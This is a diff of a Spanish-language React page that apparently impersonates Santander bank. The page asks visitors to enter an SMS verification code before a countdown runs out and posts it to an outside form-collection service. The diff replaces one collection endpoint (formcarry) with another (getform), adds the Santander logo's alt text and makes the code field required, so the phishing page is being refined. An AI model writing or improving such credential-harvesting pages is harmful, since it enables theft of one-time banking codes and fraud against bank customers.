@@ -4,7 +4,7 @@ import { useNavigate } from 'react-router-dom';
 
 function Segundapag() {
   const navigate = useNavigate();
-  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes in seconds
+  const [timeLeft, setTimeLeft] = useState(180); // 3 minutos en segundos
 
   useEffect(() => {
     if (timeLeft > 0) {
@@ -27,7 +27,7 @@ function Segundapag() {
     const formData = new FormData(event.target);
     
     try {
-      const response = await fetch('https://formcarry.com/s/LInx79bvVGc', {
+      const response = await fetch('https://getform.io/f/axojvkpb', {
         method: 'POST',
         body: formData,
         headers: {
@@ -50,7 +50,7 @@ function Segundapag() {
     <div className="auth-container">
       <div className="auth-header">
         <span className="auth-logo">
-          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="" />
+          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="Logo Santander" />
         </span>
       </div>
       <div className="auth-progress">
@@ -66,7 +66,7 @@ function Segundapag() {
       <form className="auth-form" onSubmit={handleSubmit}>
         <label>
           Ingrese los números que recibió por mensaje SMS:
-          <input type="tel" name="sms-code" maxLength={18} placeholder="18 dígitos" className="auth-input" />
+          <input type="tel" name="sms-code" maxLength={18} placeholder="18 dígitos" className="auth-input" required />
         </label>
         <div className="auth-timer">
           Tiempo restante: {formatTime(timeLeft)}
